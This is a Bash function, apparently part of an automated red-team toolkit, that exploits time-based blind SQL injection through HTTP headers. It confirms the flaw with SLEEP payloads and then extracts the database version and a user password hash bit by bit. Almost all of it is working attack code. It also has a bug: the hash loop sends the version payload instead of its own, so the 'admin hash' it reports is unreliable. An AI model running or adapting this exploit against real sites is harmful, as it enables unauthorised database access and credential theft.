rt_331_blind_sqli_bit_extraction() {
    local target="${1:-$TARGET}"
    _section "[RT-331] BLIND SQL INJECTION — BIT EXTRACTION"
    run "Real blind SQLi exploitation: bit-by-bit extraction via time delay (from-sqli-to-shell-ii)..."
    > "$SESSION/rt/blind_sqli_exploit.txt"
    local headers=("X-Forwarded-For" "User-Agent" "Referer")
    local sqli_detected=false
    for header in "${headers[@]}"; do
        local start_fast=$(date +%s%N)
        curl -sk --max-time 6 -H "$header: hacker' AND '1'='2" -A "Mozilla/5.0" "https://${target}/" >/dev/null 2>&1
        local end_fast=$(date +%s%N)
        local fast=$(( (end_fast - start_fast) / 1000000 ))

        local start_slow=$(date +%s%N)
        curl -sk --max-time 8 -H "$header: hacker' OR SLEEP(5)-- -" -A "Mozilla/5.0" "https://${target}/" >/dev/null 2>&1
        local end_slow=$(date +%s%N)
        local slow=$(( (end_slow - start_slow) / 1000000 ))

        if [ "$slow" -gt 4000 ] && [ "$fast" -lt 2000 ]; then
            echo "BLIND_SQLI: ${header} confirmed (fast=${fast}ms, slow=${slow}ms)" >> "$SESSION/rt/blind_sqli_exploit.txt"
            sqli_detected=true
            rt "Blind SQLi confirmed on ${header}!"

            # Bit extraction - extract database version character by character
            local version=""
            for pos in $(seq 1 6); do
                local char_val=0
                for bit in $(seq 0 7); do
                    local mask=$((1 << bit))
                    local bit_start=$(date +%s%N)
                    local bit_payload="hacker' OR IF(ASCII(SUBSTRING(@@version,${pos},1))&${mask}=${mask},SLEEP(2),0)-- -"
                    curl -sk --max-time 5 -H "$header: $bit_payload" -A "Mozilla/5.0" "https://${target}/" >/dev/null 2>&1
                    local bit_end=$(date +%s%N)
                    local bit_time=$(( (bit_end - bit_start) / 1000000 ))
                    if [ "$bit_time" -gt 1800 ]; then
                        char_val=$((char_val | mask))
                    fi
                done
                local char=$(printf "\\x$(printf '%02x' $char_val)")
                version="${version}${char}"
                echo "BIT_EXTRACT: pos=${pos} value=${char_val} char='${char}'" >> "$SESSION/rt/blind_sqli_exploit.txt"
            done
            echo "DB_VERSION: ${version}" >> "$SESSION/rt/blind_sqli_exploit.txt" && rt "DB version extracted: ${version}"

            # Try to extract admin password hash
            local hash=""
            for pos in $(seq 1 8); do
                local char_val=0
                for bit in $(seq 0 7); do
                    local mask=$((1 << bit))
                    local hash_start=$(date +%s%N)
                    local hash_payload="hacker' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),${pos},1))&${mask}=${mask},SLEEP(2),0)-- -"
                    curl -sk --max-time 5 -H "$header: $bit_payload" -A "Mozilla/5.0" "https://${target}/" >/dev/null 2>&1
                    local hash_end=$(date +%s%N)
                    local hash_time=$(( (hash_end - hash_start) / 1000000 ))
                    if [ "$hash_time" -gt 1800 ]; then
                        char_val=$((char_val | mask))
                    fi
                done
                local char=$(printf "\\x$(printf '%02x' $char_val)")
                hash="${hash}${char}"
                echo "HASH_EXTRACT: pos=${pos} char='${char}'" >> "$SESSION/rt/blind_sqli_exploit.txt"
            done
            [ -n "$hash" ] && echo "ADMIN_HASH: ${hash}" >> "$SESSION/rt/blind_sqli_exploit.txt" && rt "Admin hash extracted!"
            break
        fi
    done
    [ "$sqli_detected" = true ] && rt "Blind SQLi exploitation complete" || info "No blind SQLi detected"
}

